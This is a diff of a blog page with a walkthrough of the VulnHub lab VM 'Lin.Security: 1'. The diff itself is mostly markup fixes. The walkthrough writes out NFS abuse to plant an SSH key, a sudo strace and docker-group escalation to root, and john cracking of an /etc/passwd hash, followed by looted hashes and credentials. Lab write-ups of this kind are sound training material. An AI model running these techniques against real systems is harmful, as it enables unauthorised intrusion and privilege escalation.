@@ -21,39 +21,6 @@
     <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
    </head>
   <body>
-    <style>
-      .collapsible {
-        cursor: pointer;
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-        width: 100%;
-        border: none;
-        text-align: left;
-        outline: none;
-        cursor: pointer;
-      }
-      .collapsible:after {
-        content: "+";
-        transition: transform .3s ease;
-        display: inline-block;
-        font-weight: bold;
-        float: right;
-      }
-      .expanded::after {
-        content: "-";
-        -ms-transform: rotate(360deg);
-        -webkit-transform: rotate(360deg);
-        transform: rotate(360deg);
-      }
-      .nested {
-        display: none;
-      }
-      .active {
-        display: block;
-      }
-    </style>
     <div class="header">
       <table>
         <tr>
@@ -66,13 +33,13 @@
     </div>
     <div class="body">
           <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Lin.Security: 1</h1>
-                  <p class="nested"><a href="/posts/20191009_vulnhub-kioptrix5.html"> « </a>📅 published on <code>10/Oct/2019</code><a href="/posts/20191010_vulnhub-lordoftheroot101.html"> » </a></p>
+                  <p><a href="/posts/20191009_vulnhub-kioptrix5.html"> « </a>📅 published on <code>10/Oct/2019</code><a href="/posts/20191010_vulnhub-lordoftheroot101.html"> » </a></p>
                 <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/linsecurity-1,244/">Lin.Security: 1</a>. Here's an overview of the <code>enumeration → exploitation → privilege escalation</code> process:</p>
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_linsecurity1/killchain.png" /></p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
-<p class="nested"re><code># Nmap 7.70 scan initiated Wed Oct  9 19:28:13 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.linsecurity1/results/192.168.92.186/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.linsecurity1/results/192.168.92.186/scans/xml/_quick_tcp_nmap.xml 192.168.92.186
+<pre class="nested"><code># Nmap 7.70 scan initiated Wed Oct  9 19:28:13 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.linsecurity1/results/192.168.92.186/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.linsecurity1/results/192.168.92.186/scans/xml/_quick_tcp_nmap.xml 192.168.92.186
 Nmap scan report for 192.168.92.186
 Host is up, received arp-response (0.0024s latency).
 Scanned at 2019-10-09 19:28:19 PDT for 8s
@@ -110,13 +77,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre>
 
 <p class="nested">2. We find that there is an open NFS share for the <code>/home/peter</code> directory on the target system:  </p>
-<p class="nested"re><code>showmount -e 192.168.92.186
+<pre class="nested"><code>showmount -e 192.168.92.186
 </code></pre>
 
 <p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_linsecurity1/screenshot01.png" />  </p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
-<h4>Open Ports:</h4>
-<p class="nested"re><code>22/tcp     |  ssh       |  OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>22/tcp     |  ssh       |  OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
 111/tcp    |  rpcbind   |  2-4 (RPC #100000)
 2049/tcp   |  nfs_acl   |  3 (RPC #100227)
 37211/tcp  |  mountd    |  1-3 (RPC #100005)
@@ -125,13 +92,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 57997/tcp  |  mountd    |  1-3 (RPC #100005)
 </code></pre>
 
-<h4>Users</h4>
-<p class="nested"re><code>ssh: peter
+<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
+<pre class="nested"><code>ssh: peter
 </code></pre>
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We mount this share locally and copy our SSH public key to the newly created <code>.ssh</code> directory within mounted NFS share:  </p>
-<p class="nested"re><code>cp ~/.ssh/id_rsa.pub ./authorized_keys
+<pre class="nested"><code>cp ~/.ssh/id_rsa.pub ./authorized_keys
 mkdir share
 mount 192.168.92.186:/home/peter share/ -o vers=3
 useradd -u 1001 peter
@@ -145,18 +112,18 @@ cp ../authorized_keys .ssh/
 <p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_linsecurity1/screenshot03.png" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_linsecurity1/screenshot04.png" />  </p>
 <p class="nested">2. Now we can SSH into the target system as user <code>peter</code>:  </p>
-<p class="nested"re><code>ssh peter@192.168.92.186
+<pre class="nested"><code>ssh peter@192.168.92.186
 </code></pre>
 
 <p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_linsecurity1/screenshot05.png" />  </p>
 <p class="nested">3. We find an interesting file <code>.secret</code> under user <code>susan</code>'s home directory. This file has the password in cleartext which we can use to login:  </p>
-<p class="nested"re><code>cat /home/susan/.secret
+<pre class="nested"><code>cat /home/susan/.secret
 su susan
 </code></pre>
 
 <p class="nested"><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_linsecurity1/screenshot06.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<p class="nested"re><code>peter@linsecurity&gt; id
+<pre class="nested"><code>peter@linsecurity&gt; id
 uid=1001(peter) gid=1005(peter) groups=1005(peter),999(docker)
 peter@linsecurity&gt;  
 peter@linsecurity&gt; uname
@@ -180,7 +147,7 @@ susan
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. We find that the user <code>peter</code> can run <code>strace</code> with elevated privileges. This gives us a option to elevate privileges by tracing a program that spawns a shell:  </p>
-<p class="nested"re><code>nano privesc.c
+<pre class="nested"><code>nano privesc.c
   #include &lt;stdlib.h&gt;
   #include &lt;unistd.h&gt;
   int main() {
@@ -195,7 +162,7 @@ sudo strace ./privesc
 <p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_linsecurity1/screenshot07.png" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_linsecurity1/screenshot08.png" />  </p>
 <p class="nested">2. We can also elevate privileges using <code>docker</code> since the user <code>peter</code> is already a member of group <code>docker</code>:  </p>
-<p class="nested"re><code>mkdir docker-test
+<pre class="nested"><code>mkdir docker-test
 cd docker-test
 cat &gt; Dockerfile
   FROM debian:wheezy
@@ -213,7 +180,7 @@ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff &amp;
 <p class="nested"><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_vulnhub_linsecurity1/screenshot10.png" />  </p>
 <p class="nested"><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_vulnhub_linsecurity1/screenshot11.png" />  </p>
 <p class="nested">3. We find that the user <code>insecurity</code>'s (unsalted) password hash is stored within <code>/etc/passwd</code>. We run a bruteforce on this hash to get the cleartext password. Since this user has same uid/gid as user <code>root</code>, we get elevated access on the target system:  </p>
-<p class="nested"re><code>cat /etc/passwd
+<pre class="nested"><code>cat /etc/passwd
 echo &quot;insecurity:AzER3pBZh6WZE:0:0::/:/bin/sh&quot; &gt;passwd
 john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt passwd
   P@ssw0rd         (insecurity)
@@ -224,14 +191,14 @@ ssh insecurity@192.168.92.186
 <p class="nested"><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_linsecurity1/screenshot13.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
-<p class="nested"re><code>root:$6$aorWKpxj$yOgku4F1ZRbqvSxxUtAYY2/6K/UU5wLobTSz/Pw5/ILvXgq9NibQ0/NQbOr1Wzp2bTbpNQr1jNNlaGjXD........................
+<pre class="nested"><code>root:$6$aorWKpxj$yOgku4F1ZRbqvSxxUtAYY2/6K/UU5wLobTSz/Pw5/ILvXgq9NibQ0/NQbOr1Wzp2bTbpNQr1jNNlaGjXD........................
 bob:$6$Kk0DA.6Xha4nL2p5$jq7qoit2l4ckULg1ZxcbL5wUz2Ld2ZUa.RYaIMs.Lma0EFGheX9yCXfKy37K0GsHz50FYIqIESo4QXWL.........................
 peter:$6$QpjS4vUG$Zi1KcJ7cRB8TJG9A/x7GhQQvJ0RoYwG4Jxj/6R58SJddU2X/QTQKNJWzwiByeTELKeyp0vS83kPsYITbT........................
 susan:$6$5oSmml7K$0joeavcuzw4qxDJ2LsD1ablUIrFhycVoIXL3rxN/3q2lVpQOKLufta5tqMRIh30Gb32IBp5yZ7XvBR6uX........................
 </code></pre>
 
 <h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
-<p class="nested"re><code>ssh: bob/secr.., susan/MySuperS3cretV....., insecurity/P@ss....
+<pre class="nested"><code>ssh: bob/secr.., susan/MySuperS3cretV....., insecurity/P@ss....
 </code></pre>
 
 <h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
@@ -240,19 +207,17 @@ susan:$6$5oSmml7K$0joeavcuzw4qxDJ2LsD1ablUIrFhycVoIXL3rxN/3q2lVpQOKLufta5tqMRIh3
 <li><a href="https://in.security/lin-security-walkthrough/">https://in.security/lin-security-walkthrough/</a>  </li>
 <li><a href="https://hackso.me/lin.security-1-walkthrough/">https://hackso.me/lin.security-1-walkthrough/</a>  </li>
 </ul>
-        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p class="nested" style="text-align:center;">« <a href="/posts/20191009_vulnhub-kioptrix5.html">[VulnHub] Kioptrix: 2014 (#5)...</a> « | » <a href="/posts/20191010_vulnhub-lordoftheroot101.html">[VulnHub] Lord Of The Root: 1....</a> »</p>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20191009_vulnhub-kioptrix5.html">[VulnHub] Kioptrix: 2014 (#5)...</a> « | » <a href="/posts/20191010_vulnhub-lordoftheroot101.html">[VulnHub] Lord Of The Root: 1....</a> »</p>
             </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
     <script>
       function toggle(elem) {
         elem.classList.toggle("expanded");
-
-        var ish2 = false; var ish3 = false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
-        console.log(elem); console.log(ish2); console.log(ish3);
-
+        var ish2=false; var ish3=false; var ish4=false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
+        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
         var sibling = elem.nextElementSibling;
         while (sibling) {
           if (ish2 && sibling.classList.contains("h2")) {
@@ -260,6 +225,10 @@ susan:$6$5oSmml7K$0joeavcuzw4qxDJ2LsD1ablUIrFhycVoIXL3rxN/3q2lVpQOKLufta5tqMRIh3
             break;
           }
           if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
             sibling.classList.toggle("active");
             break;
           }
